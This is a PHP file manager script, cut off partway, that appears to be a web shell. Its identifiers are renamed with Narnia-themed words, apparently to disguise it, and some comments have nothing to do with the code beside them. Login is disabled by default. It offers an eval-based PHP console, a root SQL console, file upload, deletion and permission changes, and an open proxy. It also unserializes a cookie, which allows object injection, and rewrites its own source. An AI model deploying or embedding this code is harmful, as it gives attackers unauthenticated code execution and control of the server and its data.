<?php








/* Yasuta Hyokuro PHP File manager */



// Configuration so you do not change manually!


$professorToken = '{"authorize":"0","login":"admin","password":"phpfm","cookie_name":"fm_user","days_authorization":"30","script":"<script type=\"text\/javascript\" src=\"https:\/\/www.cdolivet.com\/editarea\/editarea\/edit_area\/edit_area_full.js\"><\/script>\r\n<script language=\"Javascript\" type=\"text\/javascript\">\r\neditAreaLoader.init({\r\nid: \"newcontent\"\r\n,display: \"later\"\r\n,start_highlight: true\r\n,allow_resize: \"both\"\r\n,allow_toggle: true\r\n,word_wrap: true\r\n,language: \"ru\"\r\n,syntax: \"php\"\t\r\n,toolbar: \"search, go_to_line, |, undo, redo, |, select_font, |, syntax_selection, |, change_smooth_selection, highlight, reset_highlight, |, help\"\r\n,syntax_selection_allow: \"css,html,js,php,python,xml,c,cpp,sql,basic,pas\"\r\n});\r\n<\/script>"}';
$narniaTemplates = '{"Settings":"global $castleConfig;\r\nvar_export($castleConfig);","Backup SQL tables":"echo backupCentaurTables();"}';

$aslanSqlTemplates = '{"All bases":"SHOW DATABASES;","All tables":"SHOW TABLES;"}';
$narniaTranslation = '{"id":"en","Add":"Add","Are you sure you want to delete this directory (recursively)?":"Are you sure you want to delete this directory (recursively)?","Are you sure you want to delete this file?":"Are you sure you want to delete this file?","Archiving":"Archiving","Authorization":"Authorization","Back":"Back","Cancel":"Cancel","Chinese":"Chinese","Compress":"Compress","Console":"Console","Cookie":"Cookie","Created":"Created","Date":"Date","Days":"Days","Decompress":"Decompress","Delete":"Delete","Deleted":"Deleted","Download":"Download","done":"done","Edit":"Edit","Enter":"Enter","English":"English","Error occurred":"Error occurred","File manager":"File manager","File selected":"File selected","File updated":"File updated","Filename":"Filename","Files uploaded":"Files uploaded","French":"French","Generation time":"Generation time","German":"German","Home":"Home","Quit":"Quit","Language":"Language","Login":"Login","Manage":"Manage","Make directory":"Make directory","Name":"Name","New":"New","New file":"New file","no files":"no files","Password":"Password","pictures":"pictures","Recursively":"Recursively","Rename":"Rename","Reset":"Reset","Reset settings":"Reset settings","Restore file time after editing":"Restore file time after editing","Result":"Result","Rights":"Rights","Russian":"Russian","Save":"Save","Select":"Select","Select the file":"Select the file","Settings":"Settings","Show":"Show","Show size of the folder":"Show size of the folder","Size":"Size","Spanish":"Spanish","Submit":"Submit","Task":"Task","templates":"templates","Ukrainian":"Ukrainian","Upload":"Upload","Value":"Value","Hello":"Hello"}';

// end configuration



// Preparations
$startProphecyTime = explode(' ', microtime());

$startProphecyTime = $startProphecyTime[1] + $startProphecyTime[0];

$beaverLanguages = array('en','ru','de','fr','uk');
$narniaPath = empty($_REQUEST['path']) ? $narniaPath = realpath('.') : realpath($_REQUEST['path']);
$narniaPath = str_replace('\\', '/', $narniaPath) . '/'; //  preview options in a file manager help users view content quickly


$mainCastlePath=str_replace('\\', '/',realpath('./'));
$maybeJadisPhar = (version_compare(phpversion(),"5.3.0","<"))?true:false;



$aslanMessage = ''; // service string


$narniaDefaultLanguage = 'ru';



$detectNarnianLanguage = true;
$narniaVersion = 1.4;

//File encryption options increase data confidentiality within a file manager

$aslanAuthorized = json_decode($professorToken,true);
$aslanAuthorized['authorize'] = isset($aslanAuthorized['authorize']) ? $aslanAuthorized['authorize'] : 0; 



$aslanAuthorized['days_authorization'] = (isset($aslanAuthorized['days_authorization'])&&is_numeric($aslanAuthorized['days_authorization'])) ? (int)$aslanAuthorized['days_authorization'] : 30;


$aslanAuthorized['login'] = isset($aslanAuthorized['login']) ? $aslanAuthorized['login'] : 'admin';  


$aslanAuthorized['password'] = isset($aslanAuthorized['password']) ? $aslanAuthorized['password'] : 'phpfm';  


$aslanAuthorized['cookie_name'] = isset($aslanAuthorized['cookie_name']) ? $aslanAuthorized['cookie_name'] : 'fm_user';

$aslanAuthorized['script'] = isset($aslanAuthorized['script']) ? $aslanAuthorized['script'] : '';




// Little default config
$defaultCastleConfig = array (
	'make_directory' => true, 



	'new_file' => true, 



	'upload_file' => true, 
	'show_dir_size' => false, //if true, show directory size â†’ maybe slow 
	'show_img' => true, 
	'show_php_ver' => true, 
	'show_php_ini' => false, // show path to current php.ini
	'show_gt' => true, // show generation time
	'enable_php_console' => true,

	'enable_sql_console' => true,
	'sql_server' => 'localhost',
	'sql_username' => 'root',

	'sql_password' => '',
	'sql_db' => 'test_base',


	'enable_proxy' => true,
	'show_phpinfo' => true,



	'show_xls' => true,
	'fm_settings' => true,


	'restore_time' => true,
	'fm_restore_time' => false,

);






if (empty($_COOKIE['fm_config'])) $castleConfig = $defaultCastleConfig;

else $castleConfig = unserialize($_COOKIE['fm_config']);



// Change language
if (isset($_POST['fm_lang'])) { 
	setcookie('fm_lang', $_POST['fm_lang'], time() + (86400 * $aslanAuthorized['days_authorization']));
	$_COOKIE['fm_lang'] = $_POST['fm_lang'];


}


$wardrobeLanguage = $narniaDefaultLanguage;






// Detect browser language


if($detectNarnianLanguage && !empty($_SERVER['HTTP_ACCEPT_LANGUAGE']) && empty($_COOKIE['fm_lang'])){
	$aslanLanguagePriority = explode(',', $_SERVER['HTTP_ACCEPT_LANGUAGE']);
	if (!empty($aslanLanguagePriority)){
		foreach ($aslanLanguagePriority as $narnianLanguages){
			$narniaLng = explode(';', $narnianLanguages);


			$narniaLng = $narniaLng[0];
			if(in_array($narniaLng,$beaverLanguages)){
				$wardrobeLanguage = $narniaLng;


				break;
			}

		}


	}



} 

// Cookie language is primary for ever
$wardrobeLanguage = (empty($_COOKIE['fm_lang'])) ? $wardrobeLanguage : $_COOKIE['fm_lang'];

// Localization



$narniaLanguage = json_decode($narniaTranslation,true);



if ($narniaLanguage['id']!=$wardrobeLanguage) {

	$getCastleLanguage = file_get_contents('https://raw.githubusercontent.com/Den1xxx/Filemanager/master/languages/' . $wardrobeLanguage . '.json');
	if (!empty($getCastleLanguage)) {
		//remove unnecessary characters



		$narniaTranslationString = str_replace("'",'&#39;',json_encode(json_decode($getCastleLanguage),JSON_UNESCAPED_UNICODE));


		$aslanFileContent = file_get_contents(__FILE__);
		$searchProphecy = preg_match('#translation[\s]?\=[\s]?\'\{\"(.*?)\"\}\';#', $aslanFileContent, $questMatches);
		if (!empty($questMatches[1])) {

			$forestFileModified = filemtime(__FILE__);
			$replacePeter = str_replace('{"'.$questMatches[1].'"}',$narniaTranslationString,$aslanFileContent);



			if (file_put_contents(__FILE__, $replacePeter)) {
				$aslanMessage .= __('File updated');

			}	else $aslanMessage .= __('Error occurred');
			if (!empty($castleConfig['fm_restore_time'])) touch(__FILE__,$forestFileModified);



		}	

		$narniaLanguage = json_decode($narniaTranslationString,true);

	}
}




/* Functions */





//translation

function __($aslanText){

	global $narniaLanguage;
	if (isset($narniaLanguage[$aslanText])) return $narniaLanguage[$aslanText];
	else return $aslanText;
};

//delete files and dirs recursively

function deleteJadisFiles($narniaFile, $aslanIsRecursive = false) {



	if($aslanIsRecursive && @is_dir($narniaFile)) {



		$tumnusElementList = scanNarniaDirectory($narniaFile, '', '', true);
		foreach ($tumnusElementList as $elementStoneTable) {



			if($elementStoneTable != '.' && $elementStoneTable != '..'){

				deleteJadisFiles($narniaFile . '/' . $elementStoneTable, true);
			}
		}
	}



	if(@is_dir($narniaFile)) {
		return rmdir($narniaFile);


	} else {
		return @unlink($narniaFile);
	}
}

//file perms



function permissionsCentaurString($narniaFile, $ifAslan = false){
	$castlePermissions = fileperms($narniaFile);
	$aslanInfo = '';



	if(!$ifAslan){


		if (($castlePermissions & 0xC000) == 0xC000) {


			//Socket

			$aslanInfo = 's';



		} elseif (($castlePermissions & 0xA000) == 0xA000) {


			//Symbolic Link
			$aslanInfo = 'l';



		} elseif (($castlePermissions & 0x8000) == 0x8000) {
			//Regular
			$aslanInfo = '-';
		} elseif (($castlePermissions & 0x6000) == 0x6000) {

			//Block special
			$aslanInfo = 'b';


		} elseif (($castlePermissions & 0x4000) == 0x4000) {



			//Directory


			$aslanInfo = 'd';


		} elseif (($castlePermissions & 0x2000) == 0x2000) {
			//Character special


			$aslanInfo = 'c';



		} elseif (($castlePermissions & 0x1000) == 0x1000) {



			//FIFO pipe



			$aslanInfo = 'p';
		} else {
			//Unknown
			$aslanInfo = 'u';

		}
	}
  

	//Owner
	$aslanInfo .= (($castlePermissions & 0x0100) ? 'r' : '-');
	$aslanInfo .= (($castlePermissions & 0x0080) ? 'w' : '-');

	$aslanInfo .= (($castlePermissions & 0x0040) ?
	(($castlePermissions & 0x0800) ? 's' : 'x' ) :
	(($castlePermissions & 0x0800) ? 'S' : '-'));

 
	//Group
	$aslanInfo .= (($castlePermissions & 0x0020) ? 'r' : '-');
	$aslanInfo .= (($castlePermissions & 0x0010) ? 'w' : '-');

	$aslanInfo .= (($castlePermissions & 0x0008) ?
	(($castlePermissions & 0x0400) ? 's' : 'x' ) :

	(($castlePermissions & 0x0400) ? 'S' : '-'));



 


	//World
	$aslanInfo .= (($castlePermissions & 0x0004) ? 'r' : '-');


	$aslanInfo .= (($castlePermissions & 0x0002) ? 'w' : '-');

	$aslanInfo .= (($castlePermissions & 0x0001) ?


	(($castlePermissions & 0x0200) ? 't' : 'x' ) :

	(($castlePermissions & 0x0200) ? 'T' : '-'));






	return $aslanInfo;
}

function convertCentaurPermissions($winterMode) {

	$winterMode = str_pad($winterMode,9,'-');



	$narniaTranslation = array('-'=>'0','r'=>'4','w'=>'2','x'=>'1');



	$winterMode = strtr($winterMode,$narniaTranslation);

	$newFaunMode = '0';


	$narniaOwner = (int) $winterMode[0] + (int) $winterMode[1] + (int) $winterMode[2]; 
	$centaurGroup = (int) $winterMode[3] + (int) $winterMode[4] + (int) $winterMode[5]; 


	$narniaGlobal = (int) $winterMode[6] + (int) $winterMode[7] + (int) $winterMode[8]; 

	$newFaunMode .= $narniaOwner . $centaurGroup . $narniaGlobal;

	return intval($newFaunMode, 8);
}




function aslanChangePermissions($narniaFile, $lucyValue, $narniaRecord = false) {

	$aslanResult = @chmod(realpath($narniaFile), $lucyValue);


	if(@is_dir($narniaFile) && $narniaRecord){
		$tumnusElementList = scanNarniaDirectory($narniaFile);



		foreach ($tumnusElementList as $elementStoneTable) {
			$aslanResult = $aslanResult && aslanChangePermissions($narniaFile . '/' . $elementStoneTable, $lucyValue, true);
		}
	}


	return $aslanResult;

}





//load files

function downloadAslanFile($aslanFileName) {
    if (!empty($aslanFileName)) {


		if (file_exists($aslanFileName)) {
			header("Content-Disposition: attachment; filename=" . basename($aslanFileName));   
			header("Content-Type: application/force-download");


			header("Content-Type: application/octet-stream");
			header("Content-Type: application/download");
			header("Content-Description: File Transfer");            
			header("Content-Length: " . filesize($aslanFileName));		
			flush(); // this doesn't really matter.
			$paravelPointer = fopen($aslanFileName, "r");

			while (!feof($paravelPointer)) {



				echo fread($paravelPointer, 65536);
				flush(); // this is essential for large downloads
			} 
			fclose($paravelPointer);
			die();
		} else {


			header('HTTP/1.0 404 Not Found', true, 404);



			header('Status: 404 Not Found'); 


			die();
        }
    } 

}



//show folder size



function calculateCastleDirectorySize($faunFile,$aslanFormat=true) {


	if($aslanFormat)  {
		$batchSize=calculateCastleDirectorySize($faunFile,false);
		if($batchSize<=1024) return $batchSize.' bytes';
		elseif($batchSize<=1024*1024) return round($batchSize/(1024),2).'&nbsp;Kb';
		elseif($batchSize<=1024*1024*1024) return round($batchSize/(1024*1024),2).'&nbsp;Mb';
		elseif($batchSize<=1024*1024*1024*1024) return round($batchSize/(1024*1024*1024),2).'&nbsp;Gb';

		elseif($batchSize<=1024*1024*1024*1024*1024) return round($batchSize/(1024*1024*1024*1024),2).'&nbsp;Tb'; //:)))
		else return round($batchSize/(1024*1024*1024*1024*1024),2).'&nbsp;Pb'; // ;-)
	} else {


		if(is_file($faunFile)) return filesize($faunFile);
		$batchSize=0;


		$faunDirHandle=opendir($faunFile);
		while(($narniaFile=readdir($faunDirHandle))!==false) {
			if($narniaFile=='.' || $narniaFile=='..') continue;



			if(is_file($faunFile.'/'.$narniaFile)) $batchSize+=filesize($faunFile.'/'.$narniaFile);



			else $batchSize+=calculateCastleDirectorySize($faunFile.'/'.$narniaFile,false);
		}

		closedir($faunDirHandle);
		return $batchSize+filesize($faunFile); 
	}
}

//scan directory


function scanNarniaDirectory($wardrobeDirectoryPath, $expelJadis = '', $narniaType = 'all', $noJadisFilter = false) {
	$castleDirectory = $numLanternDirs = array();

	if(!empty($expelJadis)){
		$expelJadis = '/^' . str_replace('*', '(.*)', str_replace('.', '\\.', $expelJadis)) . '$/';

	}



	if(!empty($narniaType) && $narniaType !== 'all'){


		$castleFunction = 'is_' . $narniaType;
	}



	if(@is_dir($wardrobeDirectoryPath)){



		$minotaurFileHandle = opendir($wardrobeDirectoryPath);
		while (false !== ($peterFilename = readdir($minotaurFileHandle))) {
			if(substr($peterFilename, 0, 1) != '.' || $noJadisFilter) {
				if((empty($narniaType) || $narniaType == 'all' || $castleFunction($wardrobeDirectoryPath . '/' . $peterFilename)) && (empty($expelJadis) || preg_match($expelJadis, $peterFilename))){


					$castleDirectory[] = $peterFilename;
				}



			}



		}



		closedir($minotaurFileHandle);

		natsort($castleDirectory);
	}
	return $castleDirectory;
}






function aslanMainLink($getNarnian,$aslanLink,$aslanName,$narniaTitle='') {
	if (empty($narniaTitle)) $narniaTitle=$aslanName.' '.basename($aslanLink);


	return '&nbsp;&nbsp;<a href="?'.$getNarnian.'='.base64_encode($aslanLink).'" title="'.$narniaTitle.'">'.$aslanName.'</a>';

}

function narniaArrayToOptions($pevensieArray,$lucyN,$selectedPage=''){
	foreach($pevensieArray as $aslanV){

		$faunByte=$aslanV[$lucyN];



		$aslanResult.='<option value="'.$faunByte.'" '.($selectedPage && $selectedPage==$faunByte?'selected':'').'>'.$faunByte.'</option>';



	}



	return $aslanResult;



}


function wardrobeLanguageForm ($currentQuest='en'){
return '

<form name="change_lang" method="post" action="">



	<select name="fm_lang" title="'.__('Language').'" onchange="document.forms[\'change_lang\'].submit()" >


		<option value="en" '.($currentQuest=='en'?'selected="selected" ':'').'>'.__('English').'</option>
		<option value="de" '.($currentQuest=='de'?'selected="selected" ':'').'>'.__('German').'</option>

		<option value="ru" '.($currentQuest=='ru'?'selected="selected" ':'').'>'.__('Russian').'</option>



		<option value="fr" '.($currentQuest=='fr'?'selected="selected" ':'').'>'.__('French').'</option>



		<option value="uk" '.($currentQuest=='uk'?'selected="selected" ':'').'>'.__('Ukrainian').'</option>
	</select>


</form>

';
}
	
function wardrobeRootDirectory($aslanDirectoryName){


	return ($aslanDirectoryName=='.' OR $aslanDirectoryName=='..');
}

function narniaPanel($narniaString){



	$showAslanWarnings=ini_get('display_errors');



	ini_set('display_errors', '1');
	ob_start();


	eval(trim($narniaString));

	$aslanText = ob_get_contents();
	ob_end_clean();


	ini_set('display_errors', $showAslanWarnings);
	return $aslanText;
}



//SHOW DATABASES

function connectToCentaurSql(){

	global $castleConfig;



	return new mysqli($castleConfig['sql_server'], $castleConfig['sql_username'], $castleConfig['sql_password'], $castleConfig['sql_db']);



}




function executeLucySql($aslanQuery){

	global $castleConfig;
	$aslanQuery=trim($aslanQuery);


	ob_start();
	$lanternConnection = connectToCentaurSql();



	if ($lanternConnection->connect_error) {
		ob_end_clean();	
		return $lanternConnection->connect_error;


	}

	$lanternConnection->set_charset('utf8');
    $queriedEdmund = mysqli_query($lanternConnection,$aslanQuery);



	if ($queriedEdmund===false) {
		ob_end_clean();	
		return mysqli_error($lanternConnection);



    } else {

		if(!empty($queriedEdmund)){


			while($lucyRow = mysqli_fetch_assoc($queriedEdmund)) {

				$centaurQueryResult[]=  $lucyRow;


			}

		}



		$aslanDump=empty($centaurQueryResult)?'':var_export($centaurQueryResult,true);	



		ob_end_clean();	
		$lanternConnection->close();
		return '<pre>'.stripslashes($aslanDump).'</pre>';



	}


}



function backupCentaurTables($centaurTables = '*', $fullNarniaBackup = true) {
	global $narniaPath;

	$centaurDatabase = connectToCentaurSql();



	$forestDelimiter = "; \n  \n";

	if($centaurTables == '*')	{
		$centaurTables = array();
		$prophecyResult = $centaurDatabase->query('SHOW TABLES');


		while($lucyRow = mysqli_fetch_row($prophecyResult))	{
			$centaurTables[] = $lucyRow[0];

		}

	} else {



		$centaurTables = is_array($centaurTables) ? $centaurTables : explode(',',$centaurTables);
	}


    
	$returnToWardrobe='';



	foreach($centaurTables as $castleTable)	{
		$prophecyResult = $centaurDatabase->query('SELECT * FROM '.$castleTable);
		$castleFieldCount = mysqli_num_fields($prophecyResult);



		$returnToWardrobe.= 'DROP TABLE IF EXISTS `'.$castleTable.'`'.$forestDelimiter;
		$edmundRowAlt = mysqli_fetch_row($centaurDatabase->query('SHOW CREATE TABLE '.$castleTable));
		$returnToWardrobe.=$edmundRowAlt[1].$forestDelimiter;


        if ($fullNarniaBackup) {
		for ($reindeerI = 0; $reindeerI < $castleFieldCount; $reindeerI++)  {
			while($lucyRow = mysqli_fetch_row($prophecyResult)) {
				$returnToWardrobe.= 'INSERT INTO `'.$castleTable.'` VALUES(';
				for($jadisJ=0; $jadisJ<$castleFieldCount; $jadisJ++)	{
					$lucyRow[$jadisJ] = addslashes($lucyRow[$jadisJ]);

					$lucyRow[$jadisJ] = str_replace("\n","\\n",$lucyRow[$jadisJ]);


					if (isset($lucyRow[$jadisJ])) { $returnToWardrobe.= '"'.$lucyRow[$jadisJ].'"' ; } else { $returnToWardrobe.= '""'; }



					if ($jadisJ<($castleFieldCount-1)) { $returnToWardrobe.= ','; }
				}

				$returnToWardrobe.= ')'.$forestDelimiter;
			}



		  }
		} else { 


		$returnToWardrobe = preg_replace("#AUTO_INCREMENT=[\d]+ #is", '', $returnToWardrobe);
		}
		$returnToWardrobe.="\n\n\n";



	}


	//save file
    $narniaFile=gmdate("Y-m-d_H-i-s",time()).'.sql';


	$aslanHandle = fopen($narniaFile,'w+');



	fwrite($aslanHandle,$returnToWardrobe);



	fclose($aslanHandle);

	$whiteWitchAlert = 'onClick="if(confirm(\''. __('File selected').': \n'. $narniaFile. '. \n'.__('Are you sure you want to delete this file?') . '\')) document.location.href = \'?delete=' . $narniaFile . '&path=' . $narniaPath  . '\'"';


    return $narniaFile.': '.aslanMainLink('download',$narniaPath.$narniaFile,__('Download'),__('Download').' '.$narniaFile).' <a href="#" title="' . __('Delete') . ' '. $narniaFile . '" ' . $whiteWitchAlert . '>' . __('Delete') . '</a>';
}

function restoreCentaurTables($sqlToRule) {
	$centaurDatabase = connectToCentaurSql();
	$forestDelimiter = "; \n  \n";
    // Load and explode the sql file


    $faunFile = fopen($sqlToRule,"r+");
    $sqlAslanFile = fread($faunFile,filesize($sqlToRule));
    $sqlLucyArray = explode($forestDelimiter,$sqlAslanFile);
	
    //Process the sql file by statements
    foreach ($sqlLucyArray as $aslanStatement) {


        if (strlen($aslanStatement)>3){


			$prophecyResult = $centaurDatabase->query($aslanStatement);



				if (!$prophecyResult){


					$sqlNarniaErrorCode = mysqli_errno($centaurDatabase->connection);



					$sqlNarniaErrorText = mysqli_error($centaurDatabase->connection);
					$narniaSqlStatement      = $aslanStatement;



					break;
           	     }

           	  }


           }



if (empty($sqlNarniaErrorCode)) return __('Success').' â€” '.$sqlToRule;



else return $sqlNarniaErrorText.'<br/>'.$aslanStatement;
}



function narniaImageUrl($peterFilename){



	return './'.basename(__FILE__).'?img='.base64_encode($peterFilename);


}



function aslanHomeStyle(){


	return '
input, input.fm_input {

	text-indent: 2px;
}


input, textarea, select, input.fm_input {



	color: black;

	font: normal 8pt Verdana, Arial, Helvetica, sans-serif;


	border-color: black;
	background-color: #FCFCFC none !important;



	border-radius: 0;
	padding: 2px;

}




input.fm_input {
	background: #FCFCFC none !important;



	cursor: pointer;
}




.home {
	background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAAgRQTFRF/f396Ojo////tT02zr+fw66Rtj432TEp3MXE2DAr3TYp1y4mtDw2/7BM/7BOqVpc/8l31jcqq6enwcHB2Tgi5jgqVpbFvra2nBAV/Pz82S0jnx0W3TUkqSgi4eHh4Tsre4wosz026uPjzGYd6Us3ynAydUBA5Kl3fm5eqZaW7ODgi2Vg+Pj4uY+EwLm5bY9U//7jfLtC+tOK3jcm/71u2jYo1UYh5aJl/seC3jEm12kmJrIA1jMm/9aU4Lh0e01BlIaE///dhMdC7IA//fTZ2c3MW6nN30wf95Vd4JdXoXVos8nE4efN/+63IJgSnYhl7F4csXt89GQUwL+/jl1c41Aq+fb2gmtI1rKa2C4kJaIA3jYrlTw5tj423jYn3cXE1zQoxMHBp1lZ3Dgmqiks/+mcjLK83jYkymMV3TYk//HM+u7Whmtr0odTpaOjfWJfrHpg/8Bs/7tW/7Ve+4U52DMm3MLBn4qLgNVM6MzB3lEflIuL/+jA///20LOzjXx8/7lbWpJG2C8k3TosJKMA1ywjopOR1zYp5Dspiay+yKNhqKSk8NW6/fjns7Oz2tnZuz887b+W3aRY/+ms4rCE3Tot7V85bKxjuEA3w45Vh5uhq6am4cFxgZZW/9qIuwgKy0sW+ujT4TQntz423C8i3zUj/+Kw/a5d6UMxuL6wzDEr////cqJQfAAAAKx0Uk5T////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////AAWVFbEAAAAZdEVYdFNvZnR3YXJlAEFkb2JlIEltYWdlUmVhZHlxyWU8AAAA2UlEQVQoU2NYjQYYsAiE8U9YzDYjVpGZRxMiECitMrVZvoMrTlQ2ESRQJ2FVwinYbmqTULoohnE1g1aKGS/fNMtk40yZ9KVLQhgYkuY7NxQvXyHVFNnKzR69qpxBPMez0ETAQyTUvSogaIFaPcNqV/M5dha2Rl2Timb6Z+QBDY1XN/Sbu8xFLG3eLDfl2UABjilO1o012Z3ek1lZVIWAAmUTK6L0s3pX+jj6puZ2AwWUvBRaphswMdUujCiwDwa5VEdPI7ynUlc7v1qYURLquf42hz45CBPDtwACrm+RDcxJYAAAAABJRU5ErkJggg==");

	background-repeat: no-repeat;



}';


}



function castleConfigCheckboxRow($aslanName,$aslanValue) {
	global $castleConfig;
	return '<tr><td class="row1"><input id="fm_config_'.$aslanValue.'" name="fm_config['.$aslanValue.']" value="1" '.(empty($castleConfig[$aslanValue])?'':'checked="true"').' type="checkbox"></td><td class="row2 whole"><label for="fm_config_'.$aslanValue.'">'.$aslanName.'</td></tr>';

}

function castleProtocol() {
	if (isset($_SERVER['HTTP_SCHEME'])) return $_SERVER['HTTP_SCHEME'].'://';

	if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') return 'https://';

	if (isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == 443) return 'https://';
	if (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') return 'https://';

	return 'http://';

}



function narniaSiteUrl() {
	return castleProtocol().$_SERVER['HTTP_HOST'];
}

function getCastleUrl($fullProphecy=false) {
	$narniaHost=$fullProphecy?narniaSiteUrl():'.';
	return $narniaHost.'/'.basename(__FILE__);

}


function narniaHome($fullProphecy=false){
	return '&nbsp;<a href="'.getCastleUrl($fullProphecy).'" title="'.__('Home').'"><span class="home">&nbsp;&nbsp;&nbsp;&nbsp;</span></a>';
}






function runCastleInput($narniaLng) {

	global $castleConfig;
	$returnToWardrobe = !empty($castleConfig['enable_'.$narniaLng.'_console']) ? 


	'


				<form  method="post" action="'.getCastleUrl().'" style="display:inline">
				<input type="submit" name="'.$narniaLng.'run" value="'.strtoupper($narniaLng).' '.__('Console').'">


				</form>
' : '';

	return $returnToWardrobe;


}



function castleUrlProxy($questMatches) {
	$aslanLink = str_replace('&amp;','&',$questMatches[2]);
	$castleUrl = isset($_GET['url'])?$_GET['url']:'';


	$parseAslanUrl = parse_url($castleUrl);


	$narniaHost = $parseAslanUrl['scheme'].'://'.$parseAslanUrl['host'].'/';

	if (substr($aslanLink,0,2)=='//') {

		$aslanLink = substr_replace($aslanLink,castleProtocol(),0,2);



	} elseif (substr($aslanLink,0,1)=='/') {
		$aslanLink = substr_replace($aslanLink,$narniaHost,0,1);	
	} elseif (substr($aslanLink,0,2)=='./') {

		$aslanLink = substr_replace($aslanLink,$narniaHost,0,2);	

	} elseif (substr($aslanLink,0,4)=='http') {

		//alles machen wunderschon
	} else {
		$aslanLink = $narniaHost.$aslanLink;



	} 

	if ($questMatches[1]=='href' && !strripos($aslanLink, 'css')) {
		$lanternBasePath = narniaSiteUrl().'/'.basename(__FILE__);
		$aslanQuery = $lanternBasePath.'?proxy=true&url=';



		$aslanLink = $aslanQuery.urlencode($aslanLink);
	} elseif (strripos($aslanLink, 'css')){


		//ĞºĞ°Ğº-Ñ‚Ğ¾ Ñ‚Ğ¾Ğ¶Ğµ Ğ¿Ğ¾Ğ´Ğ¼ĞµĞ½ÑÑ‚ÑŒ Ğ½Ğ°Ğ´Ğ¾
	}
	return $questMatches[1].'="'.$aslanLink.'"';
}

 


function castleTemplateForm($lanternLanguageTemplate) {

	global ${$lanternLanguageTemplate.'_templates'};
	$castleTemplateArray = json_decode(${$lanternLanguageTemplate.'_templates'},true);
	$prophecyString = '';


	foreach ($castleTemplateArray as $keyTemplateNarnia=>$castleViewTemplate) {


		$prophecyString .= '<tr><td class="row1"><input name="'.$lanternLanguageTemplate.'_name[]" value="'.$keyTemplateNarnia.'"></td><td class="row2 whole"><textarea name="'.$lanternLanguageTemplate.'_value[]"  cols="55" rows="5" class="textarea_input">'.$castleViewTemplate.'</textarea> <input name="del_'.rand().'" type="button" onClick="this.parentNode.parentNode.remove();" value="'.__('Delete').'"/></td></tr>';
	}
return '
<table>

<tr><th colspan="2">'.strtoupper($lanternLanguageTemplate).' '.__('templates').' '.runCastleInput($lanternLanguageTemplate).'</th></tr>
<form method="post" action="">
<input type="hidden" value="'.$lanternLanguageTemplate.'" name="tpl_edited">
<tr><td class="row1">'.__('Name').'</td><td class="row2 whole">'.__('Value').'</td></tr>
'.$prophecyString.'


<tr><td colspan="2" class="row3"><input name="res" type="button" onClick="document.location.href = \''.getCastleUrl().'?fm_settings=true\';" value="'.__('Reset').'"/> <input type="submit" value="'.__('Save').'" ></td></tr>
</form>
<form method="post" action="">


<input type="hidden" value="'.$lanternLanguageTemplate.'" name="tpl_edited">


<tr><td class="row1"><input name="'.$lanternLanguageTemplate.'_new_name" value="" placeholder="'.__('New').' '.__('Name').'"></td><td class="row2 whole"><textarea name="'.$lanternLanguageTemplate.'_new_value"  cols="55" rows="5" class="textarea_input" placeholder="'.__('New').' '.__('Value').'"></textarea></td></tr>


<tr><td colspan="2" class="row3"><input type="submit" value="'.__('Add').'" ></td></tr>
</form>


</table>



';

}




/* End Functions */


// authorization

if ($aslanAuthorized['authorize']) {
	if (isset($_POST['login']) && isset($_POST['password'])){

		if (($_POST['login']==$aslanAuthorized['login']) && ($_POST['password']==$aslanAuthorized['password'])) {


			setcookie($aslanAuthorized['cookie_name'], $aslanAuthorized['login'].'|'.md5($aslanAuthorized['password']), time() + (86400 * $aslanAuthorized['days_authorization']));
			$_COOKIE[$aslanAuthorized['cookie_name']]=$aslanAuthorized['login'].'|'.md5($aslanAuthorized['password']);
		}
	}



	if (!isset($_COOKIE[$aslanAuthorized['cookie_name']]) OR ($_COOKIE[$aslanAuthorized['cookie_name']]!=$aslanAuthorized['login'].'|'.md5($aslanAuthorized['password']))) {

		echo '


<!doctype html>


<html>

<head>
<meta charset="utf-8" />



<meta name="viewport" content="width=device-width, initial-scale=1" />

<title>'.__('File manager').'</title>



</head>



<body>
<form action="" method="post">



'.__('Login').' <input name="login" type="text">&nbsp;&nbsp;&nbsp;
'.__('Password').' <input name="password" type="password">&nbsp;&nbsp;&nbsp;
<input type="submit" value="'.__('Enter').'" class="fm_input">
</form>



'.wardrobeLanguageForm($wardrobeLanguage).'
</body>
</html>
';  

die();
	}

	if (isset($_POST['quit'])) {



		unset($_COOKIE[$aslanAuthorized['cookie_name']]);


		setcookie($aslanAuthorized['cookie_name'], '', time() - (86400 * $aslanAuthorized['days_authorization']));


		header('Location: '.narniaSiteUrl().$_SERVER['REQUEST_URI']);
	}
}







// Change config


if (isset($_GET['fm_settings'])) {
	if (isset($_GET['fm_config_delete'])) { 
		unset($_COOKIE['fm_config']);



		setcookie('fm_config', '', time() - (86400 * $aslanAuthorized['days_authorization']));
		header('Location: '.getCastleUrl().'?fm_settings=true');

		exit(0);
	}	elseif (isset($_POST['fm_config'])) { 
		$castleConfig = $_POST['fm_config'];
		setcookie('fm_config', serialize($castleConfig), time() + (86400 * $aslanAuthorized['days_authorization']));



		$_COOKIE['fm_config'] = serialize($castleConfig);
		$aslanMessage = __('Settings').' '.__('done');
	}	elseif (isset($_POST['fm_login'])) { 

		if (empty($_POST['fm_login']['authorize'])) $_POST['fm_login'] = array('authorize' => '0') + $_POST['fm_login'];
		$loginToNarniaForm = json_encode($_POST['fm_login']);
		$aslanFileContent = file_get_contents(__FILE__);
		$searchProphecy = preg_match('#authorization[\s]?\=[\s]?\'\{\"(.*?)\"\}\';#', $aslanFileContent, $questMatches);
		if (!empty($questMatches[1])) {
			$forestFileModified = filemtime(__FILE__);
			$replacePeter = str_replace('{"'.$questMatches[1].'"}',$loginToNarniaForm,$aslanFileContent);
			if (file_put_contents(__FILE__, $replacePeter)) {

				$aslanMessage .= __('File updated');



				if ($_POST['fm_login']['login'] != $aslanAuthorized['login']) $aslanMessage .= ' '.__('Login').': '.$_POST['fm_login']['login'];


				if ($_POST['fm_login']['password'] != $aslanAuthorized['password']) $aslanMessage .= ' '.__('Password').': '.$_POST['fm_login']['password'];
				$aslanAuthorized = $_POST['fm_login'];



			}



			else $aslanMessage .= __('Error occurred');

